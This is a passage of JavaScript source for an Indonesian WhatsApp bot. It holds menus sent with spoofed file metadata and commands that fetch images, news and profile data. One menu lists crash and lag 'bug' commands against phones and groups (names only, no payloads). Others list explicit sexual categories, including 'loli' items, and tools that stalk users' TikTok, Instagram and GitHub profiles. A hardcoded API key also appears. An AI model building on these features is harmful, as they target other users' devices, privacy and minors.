 │ ィ•  ${prefix}🌥️antivo
 │ ィ•  ${prefix}🌥️antivirtex
 │ ィ•  ${prefix}🌥️myrespon
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: yuu,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: "🙌 𝘾𝙝𝙖𝙣𝙚𝙡 𝙄𝙣𝙛𝙤 𝙈𝘼𝙉𝙐-𝙈𝘿 💙",
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break
case 'randommenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let rmm = `
//============================
╶─────────────┈•∘
  _〈 ❏ 〉  R A N D O M  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}⛅akira 
 │ ィ•  ${prefix}⛅akiyama 
 │ ィ•  ${prefix}⛅ana 
 │ ィ•  ${prefix}⛅art 
 │ ィ•  ${prefix}⛅asuna 
 │ ィ•  ${prefix}⛅ayuzawa 
 │ ィ•  ${prefix}⛅boruto 
 │ ィ•  ${prefix}⛅bts 
 │ ィ•  ${prefix}⛅chiho 
 │ ィ•  ${prefix}⛅chitoge 
 │ ィ•  ${prefix}⛅cosplay 
 │ ィ•  ${prefix}⛅cosplayloli 
 │ ィ•  ${prefix}⛅cosplaysagiri 
 │ ィ•  ${prefix}⛅cyber 
 │ ィ•  ${prefix}⛅deidara 
 │ ィ•  ${prefix}⛅doraemon 
 │ ィ•  ${prefix}⛅elaina 
 │ ィ•  ${prefix}⛅emilia 
 │ ィ•  ${prefix}⛅erza 
 │ ィ•  ${prefix}⛅exo  
 │ ィ•  ${prefix}⛅gamewallpaper 
 │ ィ•  ${prefix}⛅gremory 
 │ ィ•  ${prefix}⛅hacker
 │ ィ•  ${prefix}⛅hestia
 │ ィ•  ${prefix}⛅hinata
 │ ィ•  ${prefix}⛅husbu
 │ ィ•  ${prefix}⛅inori
 │ ィ•  ${prefix}⛅islamic
 │ ィ•  ${prefix}⛅isuzu
 │ ィ•  ${prefix}⛅itachi
 │ ィ•  ${prefix}⛅itori
 │ ィ•  ${prefix}⛅jennie
 │ ィ•  ${prefix}⛅jiso
 │ ィ•  ${prefix}⛅justina
 │ ィ•  ${prefix}⛅kaga
 │ ィ•  ${prefix}⛅kagura
 │ ィ•  ${prefix}⛅kakasih
 │ ィ•  ${prefix}⛅kaori
 │ ィ•  ${prefix}⛅cartoon
 │ ィ•  ${prefix}⛅shortquote
 │ ィ•  ${prefix}⛅keneki  
 │ ィ•  ${prefix}⛅kotori  
 │ ィ•  ${prefix}⛅kurumi  
 │ ィ•  ${prefix}⛅lisa  
 │ ィ•  ${prefix}⛅madara  
 │ ィ•  ${prefix}⛅megumin  
 │ ィ•  ${prefix}⛅mikasa  
 │ ィ•  ${prefix}⛅mikey  
 │ ィ•  ${prefix}⛅miku  
 │ ィ•  ${prefix}⛅minato  
 │ ィ•  ${prefix}⛅mountain  
 │ ィ•  ${prefix}⛅naruto  
 │ ィ•  ${prefix}⛅neko2  
 │ ィ•  ${prefix}⛅nekonime 
 │ ィ•  ${prefix}⛅nezuko
 │ ィ•  ${prefix}⛅onepiece  
 │ ィ•  ${prefix}⛅pentol  
 │ ィ•  ${prefix}⛅pokemon  
 │ ィ•  ${prefix}⛅programming   
 │ ィ•  ${prefix}⛅randomnime  
 │ ィ•  ${prefix}⛅randomnime2  
 │ ィ•  ${prefix}⛅rize  
 │ ィ•  ${prefix}⛅rose  
 │ ィ•  ${prefix}⛅sagiri  
 │ ィ•  ${prefix}⛅sakura  
 │ ィ•  ${prefix}⛅ sasuke  
 │ ィ•  ${prefix}⛅satanic  
 │ ィ•  ${prefix}⛅shina    
 │ ィ•  ${prefix}⛅shinka  
 │ ィ•  ${prefix}⛅shinomiya 
 │ ィ•  ${prefix}⛅shizuka  
 │ ィ•  ${prefix}⛅shota  
 │ ィ•  ${prefix}⛅space  
 │ ィ•  ${prefix}⛅technology  
 │ ィ•  ${prefix}⛅tejina  
 │ ィ•  ${prefix}⛅toukachan  
 │ ィ•  ${prefix}⛅tsunade  
 │ ィ•  ${prefix}⛅yotsuba  
 │ ィ•  ${prefix}⛅yuki  
 │ ィ•  ${prefix}⛅yulibocil 
 │ ィ•  ${prefix}⛅yumeko
 │ `
 
 await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: rmm,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: "🙌 𝘾𝙝𝙖𝙣𝙚𝙡 𝙄𝙣𝙛𝙤 -𝙈𝘿 💙",
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'markmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let mark = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＢＡＮ  &  ＵＮＢＡＮ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️bannedv1
 │ ィ•  ${prefix}🌥️bannedv2
 │ ィ•  ${prefix}🌥️bannedv3
 │ ィ•  ${prefix}🌥️bannedv4
 │ ィ•  ${prefix}🌥️bannedv5
 │ ィ•  ${prefix}🌥️bannedv6
 │ ィ•  ${prefix}🌥️bannedv7
 │ ィ•  ${prefix}🌥️unbannedv1
 │ ィ•  ${prefix}🌥️unbannedv2
 │ ィ•  ${prefix}🌥️unbannedv3
 │ ィ•  ${prefix}🌥️unbannedv4
 │ ィ•  ${prefix}🌥️unbannedv5
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: mark,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'bugmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let bug = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＢＵＧ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️iosgoogle
 │ ィ•  ${prefix}🌥️iosgoogle2
 │ ィ•  ${prefix}🌥️xioscrash
 │ ィ•  ${prefix}🌥️xioscrash2
 │ ィ•  ${prefix}🌥️xcrash
 │ ィ•  ${prefix}🌥️xcrash2
 │ ィ•  ${prefix}🌥️delaybug
 │ ィ•  ${prefix}🌥️pmbug
 │ ィ•  ${prefix}🌥️amountbug
 │ ィ•  ${prefix}🌥️docubug
 │ ィ•  ${prefix}🌥️unlimitedbug
 │ ィ•  ${prefix}🌥️bombug
 │ ィ•  ${prefix}🌥️lagbug
 │ ィ•  ${prefix}🌥️trollybug
 │ ィ•  ${prefix}🌥️gcbug
 │ ィ•  ${prefix}🌥️laggcbug
 │ ィ•  ${prefix}🌥️bomgcbug
 │ ィ•  ${prefix}🌥️delaygcbug
 │ ィ•  ${prefix}🌥️docugcbug
 │ ィ•  ${prefix}🌥️unlimitedgcbug
 │ ィ•  ${prefix}🌥️trollygcbug
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: bug,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'kerangmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let krang = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＫＥＲＡＮＧ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️apakah
 │ ィ•  ${prefix}🌥️siapakah
 │ ィ•  ${prefix}🌥️benarkah
 │ ィ•  ${prefix}🌥️kapankah
 │ ィ•  ${prefix}🌥️bisakah
 │ ィ•  ${prefix}🌥️haruskah
 │ ィ•  ${prefix}🌥️cekganteng
 │ ィ•  ${prefix}🌥️cekcantik
 │ ィ•  ${prefix}🌥️cekgay
 │ ィ•  ${prefix}🌥️ceklesby
 │ ィ•  ${prefix}🌥️cekkontol
 │ ィ•  ${prefix}🌥️cekmemek
 │ ィ•  ${prefix}🌥️cekhobby
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: krang,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝙵𝚞𝚛????𝚊 𝙼𝙳 」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'islamimenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let slam = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＩＳＬＡＭＩ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️surah
 │ ィ•  ${prefix}🌥️listsurah
 │ ィ•  ${prefix}🌥️jadwalsholat
 │ ィ•  ${prefix}🌥️asmaulhusna
 │ ィ•  ${prefix}🌥️kisahnabi
 │ ィ•  ${prefix}🌥️quotesislami
 │ ィ•  ${prefix}🌥️hadist
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: slam,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'emojimenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let moji = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＥＭＯＪＩ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️igemoji
 │ ィ•  ${prefix}🌥️iphoneemoji
 │ ィ•  ${prefix}🌥️googleemoji
 │ ィ•  ${prefix}🌥️samsungemoji
 │ ィ•  ${prefix}🌥️microsoftemoji
 │ ィ•  ${prefix}🌥️whatsappemoji
 │ ィ•  ${prefix}🌥️twitteremoji
 │ ィ•  ${prefix}🌥️facebookemoji
 │ ィ•  ${prefix}🌥️skypeemoji
 │ ィ•  ${prefix}🌥️joyemoji
 │ ィ•  ${prefix}🌥️mojiemoji
 │ ィ•  ${prefix}🌥️pediaemoji
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: moji,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'nsfwmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let nsfw = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＮＳＦＷ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️nsfw *on/off*
 │ ィ•  ${prefix}🌥️hentaivid
 │ ィ•  ${prefix}🌥️hneko
 │ ィ•  ${prefix}🌥️hentai1
 │ ィ•  ${prefix}🌥️trap
 │ ィ•  ${prefix}🌥️nwaifu
 │ ィ•  ${prefix}🌥️gasm
 │ ィ•  ${prefix}🌥️milf
 │ ィ•  ${prefix}🌥️animespank
 │ ィ•  ${prefix}🌥️ahegao
 │ ィ•  ${prefix}🌥️bdsm
 │ ィ•  ${prefix}🌥️blowjob
 │ ィ•  ${prefix}🌥️cuckold
 │ ィ•  ${prefix}🌥️cum
 │ ィ•  ${prefix}🌥️eba
 │ ィ•  ${prefix}🌥️ero
 │ ィ•  ${prefix}🌥️femdom
 │ ィ•  ${prefix}🌥️foot
 │ ィ•  ${prefix}🌥️gangbang
 │ ィ•  ${prefix}🌥️glasses
 │ ィ•  ${prefix}🌥️manga
 │ ィ•  ${prefix}🌥️jahy
 │ ィ•  ${prefix}🌥️masturbation
 │ ィ•  ${prefix}🌥️hneko1
 │ ィ•  ${prefix}🌥️hneko2
 │ ィ•  ${prefix}🌥️nsfwloli
 │ ィ•  ${prefix}🌥️gifs
 │ ィ•  ${prefix}🌥️orgy
 │ ィ•  ${prefix}🌥️panties
 │ ィ•  ${prefix}🌥️gifhentai
 │ ィ•  ${prefix}🌥️pussy
 │ ィ•  ${prefix}🌥️tentacles
 │ ィ•  ${prefix}🌥️thighs
 │ ィ•  ${prefix}🌥️zettai
 │ ィ•  ${prefix}🌥️yuri
 │ ィ•  ${prefix}🌥️gifblowjob
 ╵`
 await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: nsfw,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break
 
 case 'nsfwnew':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let nsfw = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＮＳＦＷ  N E W_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️genshin
 │ ィ•  ${prefix}🌥️swimsuit
 │ ィ•  ${prefix}🌥️schoolswimsuit
 │ ィ•  ${prefix}🌥️white
 │ ィ•  ${prefix}🌥️barefoot
 │ ィ•  ${prefix}🌥️touhou
 │ ィ•  ${prefix}🌥️gamecg
 │ ィ•  ${prefix}🌥️hololive
 │ ィ•  ${prefix}🌥️uncensored
 │ ィ•  ${prefix}🌥️sungglasses
 │ ィ•  ${prefix}🌥️chain
 │ ィ•  ${prefix}🌥️shirtlift
 │ ィ•  ${prefix}🌥️weapon
 │ ィ•  ${prefix}🌥️glasses
 │ ィ•  ${prefix}🌥️fingering
 │ ィ•  ${prefix}🌥️flatchest
 │ ィ•  ${prefix}🌥️torncloth
 │ ィ•  ${prefix}🌥️bondage
 │ ィ•  ${prefix}🌥️demon
 │ ィ•  ${prefix}🌥️pantypull
 │ ィ•  ${prefix}🌥️headdress
 │ ィ•  ${prefix}🌥️headphone
 │ ィ•  ${prefix}🌥️anusview
 │ ィ•  ${prefix}🌥️shorts
 │ ィ•  ${prefix}🌥️stokings
 │ ィ•  ${prefix}🌥️topless
 │ ィ•  ${prefix}🌥️beach
 │ ィ•  ${prefix}🌥️bunnygirl
 │ ィ•  ${prefix}🌥️bunnyear
 │ ィ•  ${prefix}🌥️vampire
 │ ィ•  ${prefix}🌥️nobra
 │ ィ•  ${prefix}🌥️bikini
 │ ィ•  ${prefix}🌥️whitehair
 │ ィ•  ${prefix}🌥️blonde
 │ ィ•  ${prefix}🌥️pinkhair
 │ ィ•  ${prefix}🌥️bed
 │ ィ•  ${prefix}🌥️ponytail
 │ ィ•  ${prefix}🌥️nude
 │ ィ•  ${prefix}🌥️dress
 │ ィ•  ${prefix}🌥️underwear
 │ ィ•  ${prefix}🌥️foxgirl
 │ ィ•  ${prefix}🌥️uniform
 │ ィ•  ${prefix}🌥️skirt
 │ ィ•  ${prefix}🌥️breast
 │ ィ•  ${prefix}🌥️twintail
 │ ィ•  ${prefix}🌥️spreadpussy
 │ ィ•  ${prefix}🌥️seethrough
 │ ィ•  ${prefix}🌥️breasthold
 │ ィ•  ${prefix}🌥️fateseries
 │ ィ•  ${prefix}🌥️spreadlegs
 │ ィ•  ${prefix}🌥️openshirt
 │ ィ•  ${prefix}🌥️headband
 │ ィ•  ${prefix}🌥️nipples
 │ ィ•  ${prefix}🌥️erectnipples
 │ ィ•  ${prefix}🌥️greenhair
 │ ィ•  ${prefix}🌥️wolfgirl
 │ ィ•  ${prefix}🌥️catgirl
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: nsfw,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'beritamenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let berita = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＢＥＲＩＴＡ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️fajar
 │ ィ•  ${prefix}🌥️cnn
 │ ィ•  ${prefix}🌥️layarkaca
 │ ィ•  ${prefix}🌥️cnbc
 │ ィ•  ${prefix}🌥️tribun
 │ ィ•  ${prefix}🌥️indozone
 │ ィ•  ${prefix}🌥️kompas
 │ ィ•  ${prefix}🌥️detiknews
 │ ィ•  ${prefix}🌥️daily
 │ ィ•  ${prefix}🌥️inews
 │ ィ•  ${prefix}🌥️okezone
 │ ィ•  ${prefix}🌥️sindo
 │ ィ•  ${prefix}🌥️tempo
 │ ィ•  ${prefix}🌥️antara
 │ ィ•  ${prefix}🌥️kontan
 │ ィ•  ${prefix}🌥️merdeka
 │ ィ•  ${prefix}🌥️jalantikus
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: berita,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break
//============
case 'getpp1':
if (!isCreator) return m.reply('Ga Mau Sama Kamu')
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
let who;
try {
if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender } catch (err) {
if (m.isGroup) who = m.sender
}
let link = await Al.profilePictureUrl(who, 'image')
await Al.sendImage(m.chat, link, ``, m)
break
//========================
case 'ttstalk':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`Example: ${prefix+command} username`)
Al.sendMessage(m.chat, { react: { text: `💗`, key: m.key }})
try{
let anu = await fetchJson(`https://api.junn4.my.id/tools/tiktokstalk?username=${q}`)
const nick = anu.result.name
const username = anu.result.username
const foll = anu.result.followers
const foli = anu.result.following
const desk = anu.result.description
await Al.sendMessage(m.chat, { image: { url: anu.result.pp_user}, caption: `Name : ${nick}\nUsername : ${username}\nFollowers : ${foll}\nFollowing : ${foli}\nDescription : ${desk}`}, {quoted: m})
await Al.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}catch (error) {
m.reply(`Error!\nPastikan username sama persis dan akun tidak di privat.`);
}
}
limitAdd(m.sender, limit)
break
//========================
case 'ppcp':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let anu = await fetchJson("https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json")
Al.sendMessage(m.chat, { react: { text: `💗`, key: m.key }})
let random = anu[Math.floor(Math.random() * anu.length)]
Al.sendMessage(m.chat,{image: {url: random.male,},caption: `Couple Cowo`,},{quoted: m,})
Al.sendMessage(m.chat,{image: {url: random.female,},caption: `Couple Cewe`,},{quoted: m,})
}
limitAdd(m.sender, limit)
break
//========================
case 'igstory':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if(!text) return m.reply('*Username ig nya mana*')
let anu = await fetchJson(`https://api.zenext.xyz/downloader/instagram/story?apikey=zenzkey_14cb06f3b720&username=${text}`)
const type = anu.result.extension
const hasil = anu.result.url
await Al.sendFile(m.chat, hasil, `${type}`, m)
}
limitAdd(m.sender, limit)
break
//========================
case 'meme':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
Al.sendMessage(m.chat, { react: { text: `💗`, key: m.key }})
let meme = await fetchJson(`https://api.junn4.my.id/search/meme`)
try{
const hasil = meme.result.url
const capt = meme.result.caption
await Al.sendFile(m.chat, hasil, null, `${capt}`, m)
await Al.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
} catch (err){
m.reply(util.format(err))
}
}
limitAdd(m.sender, limit)
break
//========================
case 'artinama1':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Example: ${prefix}${command} Wann?`)
let anu = await fetchJson(`https://api.zenext.xyz/primbon/artinama?text=${text}&apikey=${aikey}`)
aiRep2(`${anu.result.arti}`)
}
limitAdd(m.sender, limit)
break
//========================
case 'artimimpi1':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Example: ${prefix}${command} mandi`)
let anu = await fetchJson(`https://api.zenext.xyz/primbon/artimimpi?query=${text}&apikey=${aikey}`)
aiRep2(`${anu.result.arti}`)
}
limitAdd(m.sender, limit)
break
//========================
case 'ghstalk': 
case 'githubstalk':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`Example ${prefix+command} Wann?`)
await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
aj = await githubstalk.githubstalk(`${q}`)
Al.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
